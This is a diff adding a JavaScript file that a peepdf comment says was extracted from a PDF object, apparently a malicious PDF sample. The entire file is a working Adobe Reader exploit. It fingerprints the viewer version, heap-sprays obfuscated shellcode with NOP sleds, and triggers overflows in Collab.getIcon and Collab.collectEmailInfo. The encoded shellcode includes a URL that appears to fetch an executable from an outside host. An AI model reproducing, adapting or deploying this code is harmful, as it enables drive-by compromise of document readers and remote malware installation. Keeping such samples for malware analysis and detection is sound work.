@@ -1,0 +1,49 @@
+// peepdf comment: Javascript code located in object 3 (version 0)
+
+var ver = app.viewerVersion.toString();
+ver = ver.replace(".", "");
+var subver = new Array(ver.charAt(0), ver.charAt(1), ver.charAt(2) + ver.charAt(3));
+
+if (subver[0] == 9 && subver[1] == 0) collab_geticon();
+if (subver[0] == 8 && (subver[1] == 0 || (subver[1] == 1 && subver[2] < 3))) collab_geticon();
+
+if (subver[0] == 7 && subver[1] == 0) collab_email();
+if (subver[0] < 7) collab_email();
+
+function fillmem() {
+    var shellco = "%u54" + "EB%u75" + "8B%u8B" + "3C%u35" + "74%u03" + "78%u56" + "F5%u76" + "8B%u03" + "20" + "%u33" + "F5%u49" + "C9%uAD" + "41%uDB" + "33%u0F" + "36%u14" + "BE%u38" + "28%u74" + "F2" + "%uC1" + "08%u0D" + "CB%uDA" + "03%uEB" + "40%u3B" + "EF%u75" + "DF%u5E" + "E7%u5E" + "8B" + "%u03" + "24%u66" + "DD%u0C" + "8B%u8B" + "4B%u1C" + "5E%uDD" + "03%u04" + "8B%u03" + "8B" + "%uC3" + "C5%u72" + "75%u6D" + "6C%u6E" + "6F%u64" + "2E%u6C" + "6C%u2e" + "00%u5C" + "2e" + "%u2E" + "70%u78" + "65%u00" + "65%uC0" + "33%u03" + "64%u30" + "40%u0C" + "78%u40" + "8B" + "%u8B" + "0C%u1C" + "70%u8B" + "AD%u08" + "40%u09" + "EB%u40" + "8B%u8D" + "34%u7C" + "40" + "%u40" + "8B%u95" + "3C%u8E" + "BF%u0E" + "4E%uE8" + "EC%uFF" + "84%uFF" + "FF%uEC" + "83" + "%u83" + "04%u24" + "2C%uFF" + "3C%u95" + "D0%uBF" + "50%u1A" + "36%u70" + "2F%u6F" + "E8" + "%uFF" + /**/
+    "FF%u8B" + "FF%u24" + "54%u8D" + "FC%uBA" + "52%uDB" + "33%u53" + "53%uEB" + "52" + "%u53" + "24%uD0" + "FF%uBF" + "5D%uFE" + "98%u0E" + "8A%u53" + "E8%uFF" + /**/
+    "FF%u83" + "FF" + "%u04" + "EC%u2C" + "83%u62" + "24%uD0" + "FF%u7E" + "BF%uE2" + "D8%uE8" + "73%uFF" + "40" + "%uFF" + "FF%uFF" + "52%uE8D" + "0%uFF" + "D7%uFF" + "FF" + "%u7468%u7074%u2F3A%u742F%u726F%u616E%u6F64%u752F%u6F6E%u672F%u7465%u7865%u2E65%u6870%u3F70%u3D6F%u2631%u3D74%u3231%u3535%u3233%u3036%u3438%u6926%u333D%u3332%u3232%u3533%u3236%u2632%u3D68%u6533%u6561%u3238%u3034%u6526%u343D";
+    var mystring = unescape(shellco);
+    var len = 0x400000 - (mystring.length * 2 + 0x38);
+    var nop = "%u90" + /**/
+    "90";
+    var spsld = unescape(nop + nop);
+    while (spsld.length * 2 < len) spsld += /**/
+    spsld;
+    spsld = spsld.substring(0, len / 2);
+    var hpblcs = (0x0c0c0c0c - 0x400000) / 0x400000;
+    var memory = new Array();
+    for (var i = 0; i < hpblcs; i++) memory[i] = spsld + mystring;
+}
+
+function collab_geticon() {
+    fillmem();
+    var bug = unescape("%09");
+    while (bug.length < 0x4000) bug += /**/
+    bug;
+    app.doc.Collab.getIcon("N." + bug);
+}
+
+function collab_email() {
+    fillmem();
+    var bug = unescape("%u0c0c");
+    while (bug.length < 44952) bug += /**/
+    bug;
+    Collab. /**/
+    collectEmailInfo({
+        subj: "",
+        msg: bug
+    });
+}
+
